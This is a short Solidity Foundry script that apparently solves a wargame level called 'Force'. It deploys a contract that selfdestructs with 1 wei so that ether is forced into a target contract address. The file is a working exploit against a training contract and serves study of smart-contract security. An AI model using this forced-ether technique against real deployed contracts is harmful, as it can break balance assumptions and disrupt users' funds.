//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../src/Force.sol";
import "forge-std/console.sol";
import "forge-std/Script.sol";

contract AttackForce {
    constructor(address payable _force) payable {
         selfdestruct(_force);
    }
}
contract ForceSolution is Script {
    address payable forceInstance = payable(0x87C9D5229A4d58a77105CeEA3D48DC9291f0813A);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new AttackForce{value: 1 wei}(forceInstance);
        vm.stopBroadcast();
    }
}
